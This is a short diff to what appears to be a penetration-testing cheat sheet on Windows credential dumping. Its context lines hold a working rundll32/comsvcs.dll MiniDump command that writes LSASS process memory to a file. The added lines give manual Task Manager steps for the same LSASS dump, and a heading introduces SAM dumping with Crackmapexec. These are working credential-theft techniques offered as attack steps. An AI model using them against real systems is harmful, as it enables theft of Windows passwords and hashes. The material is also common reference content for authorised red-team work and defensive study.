@@ -138,6 +138,10 @@ tasklist /FI "IMAGENAME eq lsass.exe"
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS PROCESS ID> C:\Users\Public\lsass.dmp full
 ```
 
+#### Use task manager
+- Find lsass process in details tab
+- Right click and select create dump file
+
 ## Dumping SAM
 #### Crackmapexec
 ```
